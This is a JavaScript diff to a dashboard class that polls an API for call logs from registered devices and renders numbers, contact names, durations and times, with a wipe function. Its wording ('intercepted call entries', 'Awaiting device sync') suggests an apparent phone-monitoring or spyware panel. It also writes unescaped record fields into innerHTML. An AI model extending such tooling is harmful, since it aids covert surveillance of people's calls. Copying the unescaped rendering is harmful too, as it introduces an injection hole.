@@ -8,7 +8,7 @@ class CallsEngine {
         await this.loadDevicesList();
         if (!this.activeDeviceId) return;
         this.fetchCalls();
-        // Har 10s me database synchronization state updates legi
+        // 10 seconds rapid telemetry polling loop
         setInterval(() => this.fetchCalls(), 10000);
     }
 
@@ -21,7 +21,7 @@ class CallsEngine {
                 const selectEl = document.getElementById('device-select');
                 if (selectEl) {
                     selectEl.innerHTML = '';
-                    if (result.data.length === 0) {
+                    if (!result.data || result.data.length === 0) {
                         selectEl.innerHTML = '<option value="">No Devices Found</option>';
                         return;
                     }
@@ -32,7 +32,6 @@ class CallsEngine {
                         selectEl.appendChild(option);
                     });
 
-                    // 🚀 FIX: LocalStorage assignment check validation sequence fixed
                     if (!this.activeDeviceId && result.data.length > 0) {
                         this.activeDeviceId = result.data[0].id;
                         localStorage.setItem('active_device_id', this.activeDeviceId);
@@ -46,18 +45,20 @@ class CallsEngine {
                     });
                 }
             }
-        } catch (e) { console.error("Device drop parsing failed:", e); }
+        } catch (e) { console.error("Device list compilation failure:", e); }
     }
 
     async fetchCalls() {
         const token = localStorage.getItem('owner_token');
+        if (!this.activeDeviceId) return;
         try {
-            const res = await fetch(`/api/calls?device_id=${this.activeDeviceId}&limit=150`, {
+            // 🚀 FIXED: Hard-pinned query sorting filter straight via proxy matrix to pull top 30 logs
+            const res = await fetch(`/api/calls?device_id=${this.activeDeviceId}&limit=30`, {
                 headers: { 'Authorization': `Bearer ${token}` }
             });
             const result = await res.json();
             this.renderCalls(result.data || []);
-        } catch (e) { console.error("Call sync fetch context error:", e); }
+        } catch (e) { console.error("Telephony Sync Core Exception:", e); }
     }
 
     renderCalls(data) {
@@ -65,31 +66,29 @@ class CallsEngine {
         if (!container) return;
 
         if (data.length === 0) {
-            container.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">No telephony entries intercepted yet.</div>';
+            container.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">No telephony logs captured yet. Awaiting device sync...</div>';
             return;
         }
 
         container.innerHTML = data.map(c => {
-            // Identity extraction configuration
-            let displayName = c.phone_number;
-            if (c.contact_name && c.contact_name !== 'Unknown') {
-                displayName = `${c.contact_name} <span style="font-size: 0.85rem; color: #888; font-family: monospace;">(${c.phone_number})</span>`;
-            }
+            // 🚀 FIXED: Saved vs Unknown Border Classifier Sequence
+            const isSaved = c.contact_name && c.contact_name !== 'Unknown' && c.contact_name.trim() !== '';
+            const classificationClass = isSaved ? 'saved-contact' : 'unknown-contact';
+            
+            const nameMarkup = isSaved 
+                ? `${c.contact_name} <span class="badge-identity badge-saved">Saved</span>` 
+                : `Unknown Number <span class="badge-identity badge-unknown">Suspicious</span>`;
 
-            // 🚀 UPGRADE: Android code types and strings conditional routing
             let callType = String(c.type).toLowerCase();
-            let label = 'UNKNOWN';
-            let color = '#95a5a6';
+            let typeLabel = 'INCOMING';
+            let typeClass = 'type-incoming';
 
-            if (callType === '1' || callType.includes('incoming')) {
-                label = 'INCOMING'; color = '#2ecc71';
-            } else if (callType === '2' || callType.includes('outgoing')) {
-                label = 'OUTGOING'; color = '#3498db';
+            if (callType === '2' || callType.includes('outgoing')) {
+                typeLabel = 'OUTGOING'; typeClass = 'type-outgoing';
             } else if (callType === '3' || callType.includes('missed')) {
-                label = 'MISSED'; color = '#e74c3c';
+                typeLabel = 'MISSED'; typeClass = 'type-missed';
             }
 
-            // 🚀 UPGRADE: Raw seconds data conversion pipeline
             let durationText = '0s';
             if (c.duration > 0) {
                 const mins = Math.floor(c.duration / 60);
@@ -97,29 +96,38 @@ class CallsEngine {
                 durationText = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
             }
 
-            // Date structure formats
+            // 🚀 FIXED: Precision Date Time parsing format layer
             const dateObj = new Date(c.timestamp);
-            const dateString = dateObj.toLocaleDateString('en-IN', { day: '2-digit', month: 'short' });
-            const timeString = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit' });
+            const dateString = dateObj.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' });
+            const timeString = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
 
             return `
-            <div class="call-card" style="border-left: 4px solid ${color};">
-                <div style="display: flex; justify-content: space-between; align-items: center;">
-                    <span style="color: white; font-weight: 600; font-size: 1.05rem;">${displayName}</span>
-                    <span class="badge-call" style="background: ${color}22; color: ${color}; border: 1px solid ${color};">${label}</span>
+            <div class="call-card ${classificationClass}">
+                <div class="call-meta-left">
+                    <div class="call-icon-frame">
+                        <i data-lucide="phone" style="width: 16px; height: 16px; color: #888;"></i>
+                    </div>
+                    <div class="call-details">
+                        <span class="contact-identity">${nameMarkup}</span>
+                        <span class="phone-raw-number">${c.phone_number}</span>
+                        <span style="color: #aaa; font-size: 12px; margin-top: 2px;">Duration: <strong style="color: #fff;">${durationText}</strong></span>
+                    </div>
                 </div>
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 4px; font-size: 0.85rem;">
-                    <span style="color: #aaa;">Duration: <strong style="color: #fff;">${durationText}</strong></span>
-                    <span style="color: #666; font-family: monospace; font-weight: bold;">${dateString} &bull; ${timeString}</span>
+                <div class="call-meta-right">
+                    <span class="badge-call-type ${typeClass}">${typeLabel}</span>
+                    <span class="call-time-string">${dateString} • ${timeString}</span>
                 </div>
             </div>
             `;
         }).join('');
+        
+        // Re-trigger icon injection for dynamic innerHTML elements
+        if (window.lucide) window.lucide.createIcons();
     }
 }
 
 window.wipeCallsHistory = async function() {
-    if(!confirm("CRITICAL PROTOCOL: Are you sure you want to permanently delete all intercepted call entries?")) return;
+    if(!confirm("CRITICAL PROTOCOL: Permanently wipe all telephony logs?")) return;
     const token = localStorage.getItem('owner_token');
     const deviceId = localStorage.getItem('active_device_id');
     try {
